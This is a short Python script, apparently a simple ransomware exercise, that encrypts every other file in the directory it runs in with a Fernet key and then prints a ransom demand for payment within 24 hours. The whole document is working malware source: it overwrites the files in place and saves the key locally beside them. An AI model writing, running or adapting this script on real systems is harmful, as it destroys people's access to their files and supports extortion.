#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
        if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)

key = Fernet.generate_key()
#print(key)

with open("thekey.key", "wb") as thekey:
        thekey.write(key)

for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)

print("All of your files have been encrypted!!, send me 1 USD in the next 24 hours or they will stay encrypted")
